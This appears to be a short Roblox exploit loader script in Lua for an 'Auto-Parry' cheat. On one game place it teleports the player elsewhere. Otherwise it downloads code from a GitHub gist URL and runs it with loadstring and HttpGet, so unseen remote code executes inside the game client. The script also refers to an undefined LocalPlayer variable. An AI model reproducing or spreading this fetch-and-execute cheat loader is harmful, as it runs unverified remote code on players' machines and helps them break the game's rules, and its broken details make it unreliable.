if game.PlaceId == 4282985734 then
game.StarterGui:SetCore("SendNotification", {
Title = "Teleport";
Text = "Teleporting to an beginner server, hold thight!";
Icon = "rbxassetid://57254792";
Duration = 5;
})
wait(7)
game:GetService("TeleportService"):Teleport(11979315221, LocalPlayer)
else
print("Auto-Parry executed")
wait(1)
loadstring(game:HttpGet("https://gist.githubusercontent.com/bobowawahahahbobobwahahawoaowabobwabo/84f3d475e176170b787ef28c2a901b29/raw/634c5da5f09ae1a947d67916786c44cee820638b/gistfile1.txt"))()
end